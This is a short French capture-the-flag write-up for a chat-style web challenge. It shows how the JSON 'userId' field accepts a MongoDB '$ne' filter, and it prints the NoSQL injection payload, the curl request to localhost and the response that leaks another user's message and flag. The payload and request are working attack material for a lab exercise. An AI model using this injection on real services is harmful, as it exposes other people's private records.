# Dio fucking retard

## Principe du challenge

On arrive sur une page web avec un formulaire qui sert à communiquer avec le serveur.
À chaque message, le serveur répond une citation aléatoire sans même lire le message envoyé.
Pour chaque utilisateur, un id aléatoire lui est attribué pour pouvoir conserver l'historique.
L'objectif est de réussir à lire les message de d'autres personnes.

## Résolution
On s'appercoit qu'à chaque rafrachissement, l'historique des messages de l'utilisateur
est conservé. C'est grace au `userId` qui est assigné lors de la première requête et qui
est stocké dans le `localeStorage`.

La première requête sert à récupéré l'historique des message en passant son `userId`.
Si c'est la première visite de l'utilisateur, un `userId` lui est assigné.

La faille provient de la récupération de l'historique des messages : le corp de la requête
est du JSON et est donc parsé comme tel. Par conséquent la valeur du `userId` envoyé par
le client peut être `null`, une `string`, un `array` ou un `object`.

On peut donc tenter une injection NoSQL en passant un filtre MongoDb qui est valide à tous
les coups :
```
{
    "userId": {
        "$ne": ""
    }
}
```

On teste ça avec curl :
```json
curl -X POST -H 'Content-Type: application/json' --data '{"userId": {"$ne": ""}}' localhost:3000/hey | jq

{
  "userId": {
    "$ne": ""
  },
  "history": [
    {
      "_id": "5e9b46fa32b62800626798c7",
      "userId": "Johnatan Joestar",
      "message": "ENSIBS{k0n0_d10_d4_!}",
      "fromDio": true
    }
  ]
}
```
